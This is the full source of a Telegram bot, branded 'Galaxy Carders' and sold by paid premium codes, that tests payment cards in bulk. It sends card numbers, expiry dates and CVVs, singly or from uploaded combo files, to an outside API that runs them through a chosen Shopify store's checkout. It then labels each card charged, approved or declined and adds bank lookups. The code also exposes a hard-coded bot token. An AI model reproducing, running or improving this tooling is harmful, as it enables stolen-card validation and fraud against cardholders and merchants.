import telebot
import requests
import re
import time
import random
import string
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import json
import os
API_TOKEN = '7971151809:AAH0pilifo7eRxHrbuCxQX9SP76bpLM4tEs'  # <-- Your actual bot token here
bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")

user_domains = {}
channel_link = "https://t.me/GalaxyBio"
admin_contact = "https://t.me/Galaxy_Carder"  # Change to your admin/payment link

codes = {}  # format: {"CODE123": {"time": expiry_ts, "days": 30}}
ADMIN_ID = 6847432039  # <-- Replace with your actual Telegram ID

from telebot.types import Message, ReplyKeyboardMarkup, KeyboardButton

# ━━━━━━━ Footer ━━━━━━━
footer = "\n\n<b>🔗 Powered by:</b> <a href='https://t.me/Galaxy_Carder'>Galaxy Carders</a>"

# ━━━━━━━ /start ━━━━━━━
@bot.message_handler(commands=['start'])
def send_welcome(message: Message):
    welcome_text = f"""
<b>✨ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞, {message.from_user.first_name}!</b>

<b>🚀 𝐆𝐚𝐥𝐚𝐱𝐲 𝐂𝐚𝐫𝐝𝐞𝐫𝐬 — Auto Shopify CC Checker</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔰 <b>Premium Features:</b>
➤ Blazing-fast Gateway Checks  
➤ Mass & Single Card Support  
➤ Live Gateway Detection + Pricing  
➤ Elegant Bot Responses  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🧠 Tip:</b> Type <code>/cmds</code> to view all available commands.
<b>💬 Tip:</b> Type <code>/help</code> to view all available commands.

<b>👑 Status:</b> {"Premium 🔓" if message.from_user.id in load_premium_users() else "Free 🔒"}

{footer}
"""
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")

# ━━━━━━━ /help ━━━━━━━
@bot.message_handler(commands=['help'])
def help_command(message: Message):
    help_text = f"""
<b>📘 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮 — 𝐆𝐚𝐥𝐚𝐱𝐲 𝐂𝐚𝐫𝐝𝐞𝐫𝐬</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 <b>/seturl</b> – Set your Shopify store domain  
🔍 <b>/myurl</b> – View your saved domain  
💳 <b>/sh</b> – Check a single card instantly  
📦 <b>/msh</b> – Check up to <b>10 cards</b> at once (inline)
📄 <b>Send .txt</b> – For mass check (more than 100 cards)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📥 <b>Card Format:</b>  
<code>5454545454545454|MM|YYYY|CVV</code>

⚠️ <b>Note:</b> /msh supports <b>max 10</b> inline cards.  
Use a <b>.txt</b> file for bulk checking.

{footer}
"""
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

# ━━━━━━━ /cmds ━━━━━━━
@bot.message_handler(commands=['cmds'])
def show_commands(message: Message):
    cmds_text = f"""
<b>📜 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>/seturl</b> – Set your Shopify domain  
📌 <b>/myurl</b> – Show your current domain  
📌 <b>/sh</b> – Check a single card  
📌 <b>/msh</b> – Check up to <b>10 cards</b> inline  
📌 <b>Send .txt</b> – Upload to mass check more than 100 cards  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Reminder:</b>  
<b>/msh</b> supports a maximum of <b>10</b> cards.  
Use <b>.txt</b> file to check in bulk.

{footer}
"""
    bot.send_message(message.chat.id, cmds_text, parse_mode="HTML")

# Load premium users from id.txt
premium_users = {}

def load_premium_users():
    try:
        with open("id.txt", "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid_str, ts_str = line.split(":", 1)
                    try:
                        uid = int(uid_str)
                        ts = float(ts_str)
                        premium_users[uid] = ts
                    except:
                        continue
    except FileNotFoundError:
        print("id.txt not found, no premium users loaded.")

load_premium_users()
def save_premium_users():
    with open("id.txt", "w") as f:
        for uid, ts in premium_users.items():
            f.write(f"{uid}:{ts}\n")

def is_premium(user_id):
    current_time = time.time()
    expiry = premium_users.get(user_id, 0)
    return current_time < expiry

def send_premium_only_message(message):
    markup = InlineKeyboardMarkup(row_width=1)
    buy_button = InlineKeyboardButton(
        text="💎 Buy Premium Access",
        url=admin_contact
    )
    markup.add(buy_button)

    premium_text = (
        "❌ <b>Access Restricted</b>\n\n"
        "This exclusive feature is available <u>only</u> to our <b><i>Premium Members</i></b>.\n\n"
        "Unlock elite access by contacting the administrator for your personalized upgrade.\n\n"
        "💎 <i>Invest in excellence. Experience the difference.</i>"
    )

    bot.reply_to(message, premium_text, reply_markup=markup)

def bin_lookup(bin_number):
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={"Accept-Version": "3", "User-Agent": "BinChecker/1.0"}
        )
        response.raise_for_status()
        data = response.json()

        return {
            "scheme": data.get("scheme", "N/A").upper() if data.get("scheme") else "N/A",
            "type": data.get("type", "N/A").upper() if data.get("type") else "N/A",
            "brand": data.get("brand", "N/A").upper() if data.get("brand") else "N/A",
            "bank": data.get("bank", {}).get("name", "N/A"),
            "country": data.get("country", {}).get("name", "N/A"),
            "currency": data.get("country", {}).get("currency", "N/A"),
            "emoji": data.get("country", {}).get("emoji", "")
        }

    except requests.RequestException as e:
        print(f"[BIN Lookup Error] {e}")
        return {
            "scheme": "N/A",
            "type": "N/A",
            "brand": "N/A",
            "bank": "N/A",
            "country": "N/A",
            "currency": "N/A",
            "emoji": ""
        }

DOMAIN_FILE = "sh.json"

def load_domains():
    if os.path.exists(DOMAIN_FILE):
        with open(DOMAIN_FILE, "r") as f:
            return json.load(f)
    return {}

def save_domains(data):
    with open(DOMAIN_FILE, "w") as f:
        json.dump(data, f, indent=2)

user_domains = load_domains()

def animate_progress(chat_id, message_id, stop_flag):
    bar_length = 15
    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    i = 0
    progress = 0

    while not stop_flag['stop']:
        filled_length = int(bar_length * progress / 100)
        bar = '▰' * filled_length + '▱' * (bar_length - filled_length)
        spin_char = spinner[i % len(spinner)]
        text = (
            f"<b>Processing request</b> {spin_char}\n"
            f"[{bar}] {progress}%"
        )
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="HTML"
            )
        except Exception:
            break
        i += 1
        progress = (progress + 5) % 105  # cycle progress from 0 to 100%
        time.sleep(0.3)

@bot.message_handler(commands=['seturl'])
def set_domain(message):
    args = message.text.split(' ', 1)
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /seturl http://yourshopdomain.com")
        return

    domain = args[1].strip()
    processing_msg = bot.reply_to(message, "⏳ Initializing...")

    stop_flag = {'stop': False}
    anim_thread = threading.Thread(target=animate_progress, args=(processing_msg.chat.id, processing_msg.message_id, stop_flag))
    anim_thread.start()

    try:
        api_url = f"https://pvtshopi-6ba0a78070c5.herokuapp.com/?site={domain}&cc=4059986128221266|12|2030|707"
        response = requests.get(api_url, timeout=20)
        response_text = response.text.strip()

        stop_flag['stop'] = True
        anim_thread.join()

        if "invalid url" in response_text.lower():
            bot.edit_message_text(
                "❌ <b>Invalid URL</b>\nPlease provide a valid shop domain.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                parse_mode="HTML"
            )
            return

        try:
            result = response.json()
            gateway = result.get("Gateway", "Unknown")
            price = result.get("Price", "Unknown")
            resp = result.get("Response", response_text)
        except Exception:
            gateway = "Unknown"
            price = "Unknown"
            resp = response_text

        if gateway.lower() == "unknown" and (price.lower() == "unknown" or price == "0"):
            bot.edit_message_text(
                "⚠️ <b>This domain does not appear to be a valid store.</b>\nPlease try a different URL.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                parse_mode="HTML"
            )
            return

        user_domains[str(message.from_user.id)] = domain
        save_domains(user_domains)

        bot.edit_message_text(
            f"<b>✅  Domain Linked Successfully!</b>\n"
            f"<pre>━━━━━━━━━━━━━━━━━━━━━</pre>\n"
            f"<b>🌐  Domain:</b>\n<code>{domain}</code>\n\n"
            f"<b>💳  Gateway:</b> <code>{gateway}</code>\n"
            f"<b>💰  Price:</b> <code>${price}</code>\n"
            f"<b>📬  Status:</b> <code>{resp}</code>\n"
            f"<pre>━━━━━━━━━━━━━━━━━━━━━</pre>",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

    except requests.RequestException as e:
        stop_flag['stop'] = True
        anim_thread.join()
        bot.edit_message_text(
            f"❌ <b>Connection Error</b>\n<code>{e}</code>",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

@bot.message_handler(commands=['myurl'])
def myurl(message):
    user_id = str(message.from_user.id)
    domain = user_domains.get(user_id)
    if not domain:
        bot.reply_to(message, "ℹ️ You have not set a domain yet. Use /seturl to add one.")
        return

    processing_msg = bot.reply_to(message, "⏳ Fetching your domain info...")

    stop_flag = {'stop': False}
    anim_thread = threading.Thread(target=animate_progress, args=(processing_msg.chat.id, processing_msg.message_id, stop_flag))
    anim_thread.start()

    try:
        api_url = f"https://pvtshopi-6ba0a78070c5.herokuapp.com/?site={domain}&cc=4966230338334896|04|2028|561"
        response = requests.get(api_url, timeout=20)
        response_text = response.text.strip()

        stop_flag['stop'] = True
        anim_thread.join()

        if "invalid url" in response_text.lower():
            bot.edit_message_text(
                "❌ <b>Invalid URL</b> stored for you.\nPlease set a new domain using /seturl.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                parse_mode="HTML"
            )
            return

        try:
            result = response.json()
            gateway = result.get("Gateway", "Unknown")
            price = result.get("Price", "Unknown")
            resp = result.get("Response", response_text)
        except Exception:
            gateway = "Unknown"
            price = "Unknown"
            resp = response_text

        bot.edit_message_text(
            f"<b>📄 Your Current Domain Info</b>\n"
            f"<pre>━━━━━━━━━━━━━━━━━━━━━</pre>\n"
            f"<b>🌐  Domain:</b>\n<code>{domain}</code>\n\n"
            f"<b>💳  Gateway:</b> <code>{gateway}</code>\n"
            f"<b>💰  Price:</b> <code>${price}</code>\n"
            f"<b>📬  Status:</b> <code>{resp}</code>\n"
            f"<pre>━━━━━━━━━━━━━━━━━━━━━</pre>",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

    except requests.RequestException as e:
        stop_flag['stop'] = True
        anim_thread.join()
        bot.edit_message_text(
            f"❌ <b>Connection Error</b>\n<code>{e}</code>",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

@bot.message_handler(commands=['code'])
def generate_code(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split(" ")
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "Usage: /code <days>\nExample: /code 30")
        return

    days = int(args[1])
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    expiry_time = time.time() + (30 * 60)  # code valid for 30 minutes
    codes[code] = {"time": expiry_time, "days": days}

    bot.reply_to(message, f"✅ Code generated:\n<code>{code}</code>\nValid for {days} days. Redeem within 30 minutes.")

@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = message.from_user.id
    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "Usage: /redeem <code>")
        return

    code = args[1].strip().upper()
    info = codes.get(code)

    if not info:
        bot.reply_to(message, "❌ Invalid or expired code.")
        return

    if time.time() > info["time"]:
        bot.reply_to(message, "❌ This code has expired.")
        del codes[code]
        return

    days = info["days"]
    current_time = time.time()
    new_expiry = max(premium_users.get(user_id, 0), current_time) + days * 86400
    premium_users[user_id] = new_expiry
    save_premium_users()
    del codes[code]

    bot.reply_to(message, f"✅ Premium activated for {days} days.\nUse /sh now.")

@bot.message_handler(commands=['sh'])
def handle_sh(message):
    user_id = message.from_user.id
    user_id_str = str(user_id)

    if not is_premium(user_id):
        send_premium_only_message(message)
        return

    try:
        start = time.time()

        full_name = message.from_user.first_name or "User"
        user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"

        if user_id_str not in user_domains:
            bot.reply_to(message, "❌ You must set a domain first using /seturl")
            return

        args = message.text.split(' ', 1)
        if len(args) != 2:
            bot.reply_to(message, "Usage: /sh card|MM|YYYY|CVV")
            return

        pattern = r'^(\d{12,19})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$'
        match = re.match(pattern, args[1].strip())
        if not match:
            bot.reply_to(message, "Invalid format. Use:\n/sh card|MM|YYYY|CVV")
            return

        card, mm, yyyy, cvv = match.groups()
        if len(yyyy) == 2:
            yyyy = "20" + yyyy

        fullz = f"{card}|{mm}|{yyyy}|{cvv}"
        bin_number = card[:6] if len(card) >= 6 else "000000"
        domain = user_domains[user_id_str]

        bot.send_chat_action(message.chat.id, 'typing')
        processing_msg = bot.send_message(
            message.chat.id,
            "❝ <b>📥 Your request has been received...</b> ❞",
            parse_mode="HTML"
        )
        time.sleep(1.5)

        bot.edit_message_text(
            "❝ <b>⏳ Connecting to Gateway...</b> ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )

        api_url = f"https://pvtshopi-6ba0a78070c5.herokuapp.com/?site={domain}&cc={fullz}"
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(api_url, headers=headers, timeout=30)
        data = response.json()

        gateway = data.get("Gateway", "Shopify Normal")
        price = data.get("Price", "0.00")
        status = data.get("Response", "").upper()

        bot.edit_message_text(
            f"❝ <b>💳 Card:</b> <code>{fullz}</code>\n"
            f"<b>🌐 Gateway:</b> {gateway} — ${price} ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )
        time.sleep(2)

        bot.edit_message_text(
            "❝ <b>✅ Gateway response received!\n📦 Preparing final result...</b> ❞",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML"
        )
        time.sleep(1.5)

        elapsed = f"{(time.time() - start):.2f}"
        bin_data = bin_lookup(bin_number)

        decline_list = [
            "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED",
            "INCORRECT_NUMBER", "UNPROCESSABLE_TRANSACTION",
            "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED", "INVAILD_CVC", "PICK_UP_CARD", "DECLINED", "INVAILD_PAYMENT_ERROR"
        ]
        approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
        unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

        if status in decline_list:
            status_display = "Declined ❌"
        elif status in approve_list:
            status_display = "Approved ❎"
        elif status in unknown_list:
            status_display = "Unknown Error ⚠️"
        else:
            status_display = "Charged 🔥 [ORDER PLACED]"

        result = f"""
<b>╔════════════════════╗</b>
<b>   ✦✧   𝓐𝓤𝓣𝓞 • 𝓢𝓗𝓞𝓟𝓘𝓕𝓨    ✧✦</b>
<b>╠════════════════════╣</b>

<b>🔐  <a href="{channel_link}">𝓒𝓪𝓻𝓭</a>:</b>  <code>{fullz}</code>
<b>📊  <a href="{channel_link}">𝓢𝓽𝓪𝓽𝓾𝓼</a>:</b>  <b>{status_display}</b>
<b>🧾  <a href="{channel_link}">𝓡𝓮𝓼𝓹𝓸𝓷𝓼𝓮</a>:</b>  <code>{status}</code>
<b>💳  <a href="{channel_link}">𝓖𝓪𝓽𝓮𝔀𝓪𝔂</a>:</b>  <code>{gateway}</code> — <b><a href="{channel_link}">💵 {price} USD</a></b>

<b>╠════════════════════════╣</b>

<b>🔍 𝓑𝓲𝓷 𝓘𝓷𝓯𝓸𝓻𝓶𝓪𝓽𝓲𝓸𝓷</b>
<b> • </b> <a href="{channel_link}">🌐</a>  <b>𝓢𝓬𝓱𝓮𝓶𝓮:</b>  <i>{bin_data.get('scheme', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">💠</a>  <b>𝓣𝔂𝓹𝓮:</b>  <i>{bin_data.get('type', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🎯</a>  <b>𝓑𝓻𝓪𝓷𝓭:</b>  <i>{bin_data.get('brand', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🏦</a>  <b>𝓑𝓪𝓷𝓴:</b>  <i>{bin_data.get('bank', 'N/A')}</i>
<b> • </b> <a href="{channel_link}">🌍</a>  <b>𝓒𝓸𝓾𝓷𝓽𝓻𝔂:</b>  <i>{bin_data.get('emoji', '')} {bin_data.get('country', 'N/A')} ({bin_data.get('currency', 'N/A')})</i>

<b>╠═══════════════════════╣</b>

<b>✅ 𝓒𝓱𝓮𝓬𝓴𝓮𝓭 𝓑𝔂:</b> {user_link}  
<b>⏱ 𝓣𝓲𝓶𝓮 𝓣𝓪𝓴𝓮𝓷:</b>  <code>{elapsed} seconds</code>

<b>🔗 𝓙𝓸𝓲𝓷 𝓞𝓾𝓻 𝓒𝓱𝓪𝓷𝓷𝓮𝓵:</b>  <a href="{channel_link}">Galaxy Carders</a>

<b>╚════════════════════════╝</b>
"""
        bot.edit_message_text(
            result,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        try:
            stop_flag['stop'] = True
            thread.join()
        except:
            pass
        bot.reply_to(message, f"<b>Error:</b> <code>{e}</code>", parse_mode="HTML")
        
import json
import time
import re
import requests

# Load user domains from sh.json once (or reload as needed)
def load_domains():
    try:
        with open("sh.json", "r") as f:
            return json.load(f)
    except:
        return {}

@bot.message_handler(commands=['msh'])
def handle_msh(message):
    user_id = str(message.from_user.id)
    start_time = time.time()

    # Load domains fresh per command so updates are recognized
    user_domains = load_domains()

    # Check premium access
    if not is_premium(int(user_id)):
        send_premium_only_message(message)
        return

    # Check domain for user
    if user_id not in user_domains:
        bot.reply_to(message, "❌ You must set a domain first using /seturl")
        return
    domain = user_domains[user_id]

    # Extract cards from message text (skip command line)
    lines = message.text.split('\n')[1:]
    if not lines:
        bot.reply_to(message, "❌ Please provide cards below the /msh command.")
        return
    cards = lines[:10]  # limit to 10 cards

    decline_list = [
        "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED",
        "DECLINED", "INCORRECT_NUMBER", "UNPROCESSABLE_TRANSACTION",
        "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED", "PICK_UP_CARD", "INVAILD_PAYMENT_ERROR", "INVAILD_CVC"
    ]
    approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
    unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

    # Initial message with header and 0 progress
    text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
            "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
            f"<b>Progress ➜</b> [0 / {len(cards)}]\n\n"
            "Processing cards, please wait...\n")
    sent_msg = bot.reply_to(message, text, parse_mode="HTML")

    # Build results progressively
    results = []

    for idx, card_line in enumerate(cards, start=1):
        line = card_line.strip()
        if not re.match(r'^\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}$', line):
            results.append(f"Card ➜ {line}\nStatus ➜ Invalid Format ⚠️\n")
        else:
            card, mm, yyyy, cvv = line.split('|')
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            fullz = f"{card}|{mm}|{yyyy}|{cvv}"

            try:
                api_url = f"https://pvtshopi-6ba0a78070c5.herokuapp.com/?site={domain}&cc={fullz}"
                headers = {"User-Agent": "Mozilla/5.0"}
                response = requests.get(api_url, headers=headers, timeout=20)
                data = response.json()

                status = data.get("Response", "").upper()

                if status in decline_list:
                    status_display = "Declined ❌"
                elif status in approve_list:
                    status_display = "Approved ❎"
                elif status in unknown_list:
                    status_display = "Unknown Error ⚠️"
                else:
                    status_display = "Charged 🔥 [ORDER PLACED]"

                results.append(
                    f"<b>Card ➜</b> {fullz}\n"
                    f"<b>Status ➜</b> {status_display}\n"
                    f"<b>Response ➜</b> {status}\n"
                )

            except Exception as e:
                results.append(
                    f"<b>Card ➜</b> {fullz}\n<b>Status ➜</b> Error 🚫\n<b>Response ➜</b> {str(e)}\n"
                )

        # Update progress message after each card
        progress_text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
                         "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                         f"<b>Progress ➜</b> [{idx} / {len(cards)}]\n\n"
                         + '\n'.join(results))
        try:
            bot.edit_message_text(progress_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
        except Exception:
            # Sometimes editing too fast or no change can cause exceptions; ignore
            pass

        time.sleep(1.5)

    # Final summary with time and user info
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""
    full_name = (first_name + " " + last_name).strip() or "User"
    user_link = f'<a href="tg://user?id={user_id}">{full_name}</a>'
    bot_credit = '<a href="https://t.me/GalaxyBio">Galaxy Carder</a>'  # Change to your channel

    final_text = (f"<b>『 Mass Auto Shopify [ /msh ] 』</b>\n"
                  "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                  f"<b>Progress ➜</b> [{len(cards)} / {len(cards)}]\n\n"
                  + '\n'.join(results) +
                  f"\n𝐓𝐢𝐦𝐞 ➜  {hours}.h {minutes}.m {seconds}.s\n"
                  f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜  {user_link} [ PREMIUM ]\n"
                  "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
                  f"𝐁𝐨𝐭 𝐁𝐲 ➜ {bot_credit}")

    # Final edit with summary
    try:
        bot.edit_message_text(final_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
    except Exception:
        pass
from telebot import types

def normalize_card(raw_cc):
    raw_cc = raw_cc.strip()
    for ch in [' ', '-', ':', ';', ',']:
        raw_cc = raw_cc.replace(ch, '')
    parts = raw_cc.split('|')
    if len(parts) == 4:
        card, mm, yy, cvv = parts
        mm = mm.zfill(2)
        yy = "20" + yy if len(yy) == 2 else yy
        return f"{card}|{mm}|{yy}|{cvv}"
    return None

ID_FILE = "id.txt"

def load_premium_users():
    premium_users = {}
    current_time = time.time()
    valid_lines = []

    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            for line in f:
                try:
                    user_id_str, expiry_str = line.strip().split(":")
                    user_id = int(user_id_str)
                    expiry = float(expiry_str)
                    if expiry > current_time:
                        premium_users[user_id] = expiry
                        valid_lines.append(f"{user_id}:{expiry}")
                except:
                    continue

    # Rewrite only valid entries
    with open(ID_FILE, "w") as f:
        f.write("\n".join(valid_lines) + "\n")

    return premium_users
def save_premium_user(user_id, days):
    expiry = time.time() + days * 86400
    premium_users = load_premium_users()
    premium_users[user_id] = expiry

    with open(ID_FILE, "w") as f:
        for uid, ts in premium_users.items():
            f.write(f"{uid}:{ts}\n")


@bot.message_handler(content_types=["document"])
def mass_shtxt_handler(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"  # ✅ Required to fix your error

    premium_users = load_premium_users()
    if user_id not in premium_users:
        bot.reply_to(message, "❌ You do not have premium access or your access has expired.")
        return

    # rest of your logic...

    start_time = time.time()

    processing = bot.reply_to(message, "📥 Upload received. Initializing check...⌛")
    message_id = processing.message_id

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data='stop'))
    bot.edit_message_text(chat_id=message.chat.id, message_id=message_id, text="🧪 Starting check...\nClick below to stop.", reply_markup=markup)

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f:
        f.write(downloaded)

    try:
        with open("sh.json", "r") as j:
            user_domains = json.load(j)
        domain = user_domains.get(str(user_id), "")
    except:
        domain = ""

    if not domain:
        bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                              text="❌ No domain set. Use /seturl to set your Shopify domain.")
        return

    with open("combo.txt", "r") as file:
        lines = [line.strip() for line in file if line.strip()]
        total = len(lines)

        if total > 100:
            bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                                  text=f"🚨 File has {total} CCs. Max allowed is 100.")
            return

        decline_list = [
            "GENERIC_ERROR", "AUTHORIZATION_ERROR", "CARD_DECLINED", "PICK_UP_CARD", "INCORRECT_NUMBER",
            "PROXY DEAD", "PROCESSING_ERROR", "EXPIRED_CARD", "CARD TOKEN IS EMPTY", "FRAUD_SUSPECTED",
            "INVALID_CVC", "INVAILD_PAYMENT_ERROR", "UNPROCESSABLE_TRANSACTION", "DECLINED"
        ]
        approve_list = ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "3D CC", "3D_AUTHENTICATION"]
        unknown_list = ["INVALID URL", "HANDLE IS EMPTY", "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"]

        ch, live, dd = 0, 0, 0

        for count, raw_cc in enumerate(lines, 1):
            if os.path.exists("stop.stop"):
                bot.edit_message_text(chat_id=message.chat.id, message_id=message_id, text="🛑 Bot stopped by user.")
                os.remove("stop.stop")
                return

            cc = normalize_card(raw_cc)
            if not cc:
                # skip invalid format lines silently
                continue

            try:
                api = f"https://pvtshopi-6ba0a78070c5.herokuapp.com/?site={domain}&cc={cc}"
                res = requests.get(api, timeout=20)
                result = res.json()
            except:
                result = {"Response": "UNKNOWN", "Status": "false", "Price": "0", "Gateway": "Unknown"}

            response = result.get("Response", "N/A").upper()
            price = result.get("Price", "N/A")
            gateway = result.get("Gateway", "Unknown")
            progress = f"{count}/{total}"

            bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                                  text=f"🔍 <b>Checking:</b> <code>{cc}</code>\n<b>Response:</b> <code>{response}</code>\n<b>Progress:</b> {progress}\n⌛ Please wait...",
                                  parse_mode="HTML", reply_markup=markup)

            if any(x in response for x in ["CHARGED", "SUCCEEDED", "ORDER PLACED", "THANK YOU"]):
                final_status = "🔥 Charged"
                ch += 1
            elif response in decline_list:
                final_status = "❌ Declined"
                dd += 1
            elif response in approve_list:
                final_status = "✅ Approved"
                live += 1
            elif response in unknown_list:
                final_status = "⚠️ Unknown"
            else:
                final_status = response
                dd += 1

            if final_status in ["🔥 Charged", "✅ Approved"]:
                msg = f"""
💳 <b>Card Checked Successfully</b>

<b>👤 User:</b> @{username}
<b>🔢 Card:</b> <code>{cc}</code>
<b>💬 Status:</b> {final_status}
<b>📩 Response:</b> <code>{response}</code>
<b>💰 Price:</b> ${price}
<b>🧾 Gateway:</b> {gateway}
<b>📊 Progress:</b> {progress}
<b>⏱ Time:</b> {round(time.time() - start_time, 2)}s

<b>🤖 Bot By:</b> @Galaxy_Carder
"""
                bot.send_message(chat_id=message.chat.id, text=msg, parse_mode="HTML")

    bot.edit_message_text(chat_id=message.chat.id, message_id=message_id,
                          text=f"""
🎯 <b>Mass Check Completed</b>

<b>🔥 Charged:</b> {ch}
<b>✅ Approved:</b> {live}
<b>❌ Dead:</b> {dd}
<b>📦 Total:</b> {total}

<b>⏱ Time Taken:</b> {round(time.time() - start_time, 2)}s
<b>👤 User:</b> @{username}

<b>🤖 Bot By:</b> @Galaxy_Carder
""", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    with open("stop.stop", "w") as f:
        pass
    bot.answer_callback_query(call.id, "Bot will stop processing.")
    bot.send_message(call.message.chat.id, "🛑 Bot has been stopped.")

print("✅ Bot is running...")
bot.infinity_polling()
